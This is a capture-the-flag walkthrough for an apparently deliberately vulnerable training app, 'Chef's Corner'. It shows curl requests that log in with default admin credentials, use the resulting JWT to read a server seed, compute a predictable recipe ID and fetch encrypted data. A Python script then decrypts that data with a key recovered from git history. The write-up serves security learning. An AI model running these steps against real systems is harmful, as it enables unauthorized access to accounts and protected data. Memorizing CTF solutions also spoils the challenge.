# Chef's Corner CTF Walkthrough

## 1. Steps to Access Admin Functionality

### 1.1 Find default admin credentials and broken login

- View source of `/login` – credentials `admin` / `admin123` are shown in the HTML.
- The frontend submits JSON with `fetch`, but the Flask backend reads `request.form`, so browser-based login is broken.
- Bypassed the frontend by sending a form-encoded POST directly:

```bash
curl 'https://chefscorner.cybersteps.de/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=admin&password=admin123'
```

Response returned a valid admin JWT:

```json
{
  "success": true,
  "token": "<ADMIN_JWT>"
}
```

### 1.2 Use admin JWT to fetch configuration

With the token obtained above:

```bash
curl 'https://chefscorner.cybersteps.de/api/config' \
  -H "Authorization: Bearer <ADMIN_JWT>"
```

Response included the real `server_seed`:

```json
{
  "environment": "production",
  "server_seed": "super-secret-server-seed-456",
  "version": "1.0.0"
}
```

---

## 2. Steps to Locate the Secret Recipe

### 2.1 Derive the secret recipe ID

From `app.py`:

```python
def calculate_recipe_id(name):
    return sha256(f"{SERVER_SEED}:{name}".encode()).hexdigest()[:16]
```

Local calculation:

```python
import hashlib

seed = "super-secret-server-seed-456"
secret_id = hashlib.sha256(f"{seed}:SECRETSAUCE".encode()).hexdigest()[:16]
print(secret_id)  # 405f2ca9d68aa7e0
```

### 2.2 Pull the encrypted secret recipe

```bash
curl 'https://chefscorner.cybersteps.de/api/recipes/405f2ca9d68aa7e0'
```

Response contained the encrypted secret:

```json
{
  "id": "405f2ca9d68aa7e0",
  "name": "Secret Recipe",
  "encrypted": true,
  "content": "gAAAAABpNYw6TLulJ3-hyXklzXHB1hgTsoXapErbNfQeWjnbscRR8P2F_xQNhu62bgDc4N3d2Zj-UhrOoCSlRBnTRA_GnWDbP8XhpZr-rLZdTTjO_tH3Iq6mZihE5vyutIXcI-xRPB-0Uqek-UYHnl8NPFeym1kiMW54YkLd3TQAYJ3xq5ewp3ls0T6FjZ06xZG3nznWSrJeVyV-G1NoEgem3e4ugHP7UAy3y0X6Fs6LEYXlrXpz6LA="
}
```

---

## 3. Steps to Recover the Encryption Key and Decrypt

### 3.1 Find `ENCRYPTION_KEY` in Git history

- Cloned the public repo and opened the following commit:
  - `https://github.com/roman-cybersteps/Chefs-Corner/commit/250bd40358ad27b70920e2fb0b80195d1938156f`
- In the diff for `app.py` there was a removed comment:

```python
ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY', 'default-encryption-key')  # TODO: I used weak-encryption-key-789 for now, will change later
```

- From this, recovered the real key:

```text
weak-encryption-key-789
```

### 3.2 Mirror the app’s decryption logic and decrypt

From `app.py`, the decryption routine uses PBKDF2 + Fernet. Created `decrypt_secret.py`:

```python
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

encrypted_recipe = (
    "gAAAAABpNYw6TLulJ3-hyXklzXHB1hgTsoXapErbNfQeWjnbscRR8P2F_xQNhu62"
    "bgDc4N3d2Zj-UhrOoCSlRBnTRA_GnWDbP8XhpZr-rLZdTTjO_tH3Iq6mZihE5vyu"
    "tIXcI-xRPB-0Uqek-UYHnl8NPFeym1kiMW54YkLd3TQAYJ3xq5ewp3ls0T6FjZ06"
    "xZG3nznWSrJeVyV-G1NoEgem3e4ugHP7UAy3y0X6Fs6LEYXlrXpz6LA="
)

def decrypt_with_key(encrypted_data: str, key: str) -> str:
    key_bytes = key.encode()
    salt = b"chefs_corner_salt"

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    derived_key = base64.urlsafe_b64encode(kdf.derive(key_bytes))
    fernet = Fernet(derived_key)
    return fernet.decrypt(encrypted_data.encode()).decode()

if __name__ == "__main__":
    key = "weak-encryption-key-789"
    plaintext = decrypt_with_key(encrypted_recipe, key)
    print(plaintext)
```

Running it:

```bash
(venv) $ python3 decrypt_secret.py
The secret sauce recipe: 1 kilo practice, 1/2 kilo fun, a pinch of curiosity, a handful of mistakes, stirred with persistence.
```

---

## 4. Summary for Submission

### Vulnerabilities used

- Hardcoded admin credentials + broken JSON/form login → easy admin JWT.
- `/api/config` exposing `server_seed`.
- Predictable secret recipe ID using `SERVER_SEED + "SECRETSAUCE"`.
- Unauthenticated access to the encrypted secret recipe via `/api/recipes/<id>`.
- Symmetric encryption key (`ENCRYPTION_KEY = "weak-encryption-key-789"`) leaked in a Git commit comment.

### Tools/scripts

- `curl` for `/login`, `/api/config`, `/api/recipes`.
- Local Python one-liners to compute `secret_id`.
- `decrypt_secret.py` to mirror app decryption and recover plaintext.

### Recovered secret recipe

> The secret sauce recipe: 1 kilo practice, 1/2 kilo fun, a pinch of curiosity, a handful of mistakes, stirred with persistence.